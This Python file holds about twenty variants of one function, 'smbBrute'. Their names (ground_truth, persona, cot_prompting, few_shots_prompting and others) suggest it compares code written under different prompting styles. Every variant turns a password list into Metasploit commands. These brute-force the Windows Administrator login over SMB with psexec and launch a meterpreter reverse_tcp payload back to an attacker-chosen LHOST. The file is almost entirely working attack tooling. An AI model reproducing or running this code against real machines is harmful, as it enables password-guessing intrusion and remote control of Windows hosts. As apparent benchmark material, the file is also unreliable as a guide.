import sys
import codecs
import os
import re

def ground_truth_code_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

def persona_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf, open(configFile, 'a') as cf:
            for line in pf:
                password = line.strip('\n').strip('\r')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + str(password) + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
    except Exception as e:
        print(f'An error occurred: {e}')

def template_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf:
            passwords = [line.strip() for line in pf]
        with open(configFile, 'w') as cf:
            for password in passwords:
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + str(password) + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
    except FileNotFoundError as fnf_error:
        print(f"Error: {fnf_error}")
    except IOError as io_error:
        print(f"Error: {io_error}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def question_refinement_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    if not os.path.isfile(passwdFile):
        raise FileNotFoundError(f"Password file {passwdFile} does not exist.")
    if not os.access(passwdFile, os.R_OK):
        raise PermissionError(f"Password file {passwdFile} is not readable.")
    try:
        with codecs.open(passwdFile, 'r', encoding='utf-8', errors='ignore') as pf:
            passwords = [line.strip() for line in pf]
        with open(configFile, 'w') as cf:
            for password in passwords:
                if not password:
                    continue
                password = re.sub(r'[^\w]', '', password)
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write(f'set SMBPass {password}\n')
                cf.write(f'set RHOST {tgtHost}\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write(f'set LPORT {lport}\n')
                cf.write(f'set LHOST {lhost}\n')
                cf.write('exploit -j -z\n')
    except Exception as e:
        sys.exit(f"An error occurred: {str(e)}")

def alternative_approaches_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf, open(configFile, 'w') as cf:
            for passwd in pf:
                passwd = passwd.strip('\n\r')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass {}\n'.format(passwd))
                cf.write('set RHOST {}\n'.format(tgtHost))
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT {}\n'.format(lport))
                cf.write('set LHOST {}\n'.format(lhost))
                cf.write('exploit -j -z\n')
    except (IOError, OSError) as e:
        print(f'File error occurred: {e}')
    except Exception as e:
        print(f'An unexpected error occurred: {e}')

def context_manager_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf:
            passwords = pf.readlines()
        with open(configFile, 'w') as cf:
            for password in passwords:
                password = password.strip('\n\r')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + str(password) + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
    except Exception as e:
        raise RuntimeError('An error occurred while processing files') from e

def flipped_interaction_3_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf:
            passwords = pf.readlines()
        with open(configFile, 'w') as cf:
            for password in passwords:
                clean_password = password.strip('\n').strip('\r')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + clean_password + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
    except FileNotFoundError:
        print('Error: Password file not found.')
    except Exception as e:
        print(f'An error occurred: {e}')

def flipped_interaction_4_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf, open(configFile, 'a') as cf:
            for password in pf:
                password = password.strip('\n\r')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + str(password) + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
                print(f'Password "{password}" written to config.')
    except IOError as e:
        print(f'An error occurred: {e}')

import logging
logging.basicConfig(filename='smb_brute_log.txt',
                    level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
def flipped_interaction_5_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf:
            passwords = pf.readlines()
    except FileNotFoundError:
        logging.error(f"Password file {passwdFile} not found.")
        return
    except Exception as e:
        logging.error(f"Unable to open password file {passwdFile}: {e}")
        return
    try:
        with open(configFile, 'a') as cf:
            for password in passwords:
                password = password.strip('\r\n')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + password + '\n')
                cf.write('set RHOST ' + str(tgtHost) + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + str(lport) + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
                logging.info(f"Added configuration for password: {password}")
    except FileNotFoundError:
        logging.error(f"Configuration file {configFile} not found.")
    except Exception as e:
        logging.error(f"Unable to write to configuration file {configFile}: {e}")

import os
def iterative_prompting_3_smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    if not os.path.isfile(passwd_file):
        raise FileNotFoundError(f'The password file {passwd_file} does not exist.')
    if not isinstance(tgt_host, str) or not tgt_host:
        raise ValueError('Invalid target host.')
    if not (isinstance(lport, int) and 0 < lport < 65536):
        raise ValueError('Invalid port number. It must be an integer between 1 and 65535.')
    if not isinstance(lhost, str) or not lhost:
        raise ValueError('Invalid local host.')
    try:
        with open(passwd_file, 'r', encoding='utf-8') as pf, open(config_file, 'w', encoding='utf-8') as cf:
            for password in pf:
                password = password.rstrip('\n').rstrip('\r')
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write(f'set SMBPass {password}\n')
                cf.write(f'set RHOST {tgt_host}\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write(f'set LPORT {lport}\n')
                cf.write(f'set LHOST {lhost}\n')
                cf.write('exploit -j -z\n')
    except IOError as e:
        raise Exception(f'Failed to read/write files: {e}')



def is_valid_ip(address):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return re.match(pattern, address) is not None
def is_valid_port(port):
    return 0 < port < 65536
    
def iterative_prompting_4_smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    if not os.path.isfile(passwd_file):
        print(f"Password file '{passwd_file}' not found.")
    if not is_valid_ip(tgt_host):
        print(f"Target host '{tgt_host}' is not a valid IP address.")
    if not is_valid_ip(lhost):
        print(f"Local host '{lhost}' is not a valid IP address.")
    if not is_valid_port(lport):
        print(f"Port '{lport}' is out of valid range (1-65535).")
    try:
        with open(passwd_file, 'r', encoding='utf-8', errors='replace') as pf:
            passwords = pf.readlines()
        with open(config_file, 'w', encoding='utf-8') as cf:
            for password in passwords:
                password = password.strip()
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write(f'set SMBPass {password}\n')
                cf.write(f'set RHOST {tgt_host}\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write(f'set LPORT {lport}\n')
                cf.write(f'set LHOST {lhost}\n')
                cf.write('exploit -j -z\n')
    except FileNotFoundError:
        raise
    except ValueError as ve:
        raise
    except Exception as e:
        raise RuntimeError(f"An unexpected error occurred: {e}")


def iterative_prompting_5_smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    if not isinstance(tgt_host, str):
        print('Target host must be a string representing an IP address.')
    if not isinstance(lhost, str):
        print('Local host must be a string representing an IP address.')
    if not isinstance(lport, int) or not (0 < lport < 65536):
        print('Local port must be an integer between 1 and 65535.')
    if not os.path.isfile(passwd_file):
        raise FileNotFoundError(f'The password file {passwd_file} does not exist.')
    try:
        with open(passwd_file, 'r', encoding='utf-8') as pf, open(config_file, 'w', encoding='utf-8') as cf:
            for line in pf:
                password = line.strip()
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write(f'set SMBUser Administrator\n')
                cf.write(f'set SMBPass {password}\n')
                cf.write(f'set RHOST {tgt_host}\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write(f'set LPORT {lport}\n')
                cf.write(f'set LHOST {lhost}\n')
                cf.write('exploit -j -z\n')
            logging.info('Configuration commands written successfully to %s.', config_file)
    except (OSError, IOError) as e:
        logging.error(f'File operation failed: {e}')
    except Exception as e:
        logging.error(f'An unexpected error occurred: {e}')

def few_shots_prompting_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pf, open(configFile, 'w') as cf:
        for password in pf:
            password = password.strip()
            cf.write('use exploit/windows/smb/psexec\n')
            cf.write('set SMBUser Administrator\n')
            cf.write(f'set SMBPass {password}\n')
            cf.write(f'set RHOST {tgtHost}\n')
            cf.write('set payload windows/meterpreter/reverse_tcp\n')
            cf.write(f'set LPORT {lport}\n')
            cf.write(f'set LHOST {lhost}\n')
            cf.write('exploit -j -z\n')

def cot_prompting_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pf, open(configFile, 'w') as cf:
        for password in pf:
            password = password.rstrip('\r\n')
            cf.write('use exploit/windows/smb/psexec\n')
            cf.write('set SMBUser Administrator\n')
            cf.write(f'set SMBPass {password}\n')
            cf.write(f'set RHOST {tgtHost}\n')
            cf.write('set payload windows/meterpreter/reverse_tcp\n')
            cf.write(f'set LPORT {lport}\n')
            cf.write(f'set LHOST {lhost}\n')
            cf.write('exploit -j -z\n')

def fact_check_list_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf:
            passwords = pf.readlines()
        with open(configFile, 'w') as cf:
            for password in passwords:
                stripped_password = password.strip()
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write(f'set SMBPass {stripped_password}\n')
                cf.write(f'set RHOST {tgtHost}\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write(f'set LPORT {lport}\n')
                cf.write(f'set LHOST {lhost}\n')
                cf.write('exploit -j -z\n')
    except FileNotFoundError as e:
        print(f"Error: {e}")
    except IOError as e:
        print(f"Error: {e}")

def not_interactive_mix_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r') as pf, open(configFile, 'w') as cf:
            for line in pf:
                password = line.strip()
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write('set SMBPass ' + password + '\n')
                cf.write('set RHOST ' + tgtHost + '\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write('set LPORT ' + lport + '\n')
                cf.write('set LHOST ' + lhost + '\n')
                cf.write('exploit -j -z\n')
    except IOError as e:
        print(f"An error occurred while handling files: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def interactive_mix_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    try:
        with open(passwdFile, 'r', encoding='utf-8') as pf:
            passwords = pf.readlines()
    except IOError as e:
        print(f"Error reading password file: {e}")
        return
    try:
        with open(configFile, 'a', encoding='utf-8') as cf:
            for password in passwords:
                password = password.strip()
                cf.write('use exploit/windows/smb/psexec\n')
                cf.write('set SMBUser Administrator\n')
                cf.write(f'set SMBPass {password}\n')
                cf.write(f'set RHOST {tgtHost}\n')
                cf.write('set payload windows/meterpreter/reverse_tcp\n')
                cf.write(f'set LPORT {lport}\n')
                cf.write(f'set LHOST {lhost}\n')
                cf.write('exploit -j -z\n')
    except IOError as e:
        print(f"Error writing to config file: {e}")

def baseline_smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    with open(passwdFile, 'r') as pf, open(configFile, 'w') as cf:
        for line in pf:
            password = line.strip('\n\r')
            cf.write('use exploit/windows/smb/psexec\n')
            cf.write('set SMBUser Administrator\n')
            cf.write('set SMBPass ' + str(password) + '\n')
            cf.write('set RHOST ' + str(tgtHost) + '\n')
            cf.write('set payload windows/meterpreter/reverse_tcp\n')
            cf.write('set LPORT ' + str(lport) + '\n')
            cf.write('set LHOST ' + lhost + '\n')
            cf.write('exploit -j -z\n')

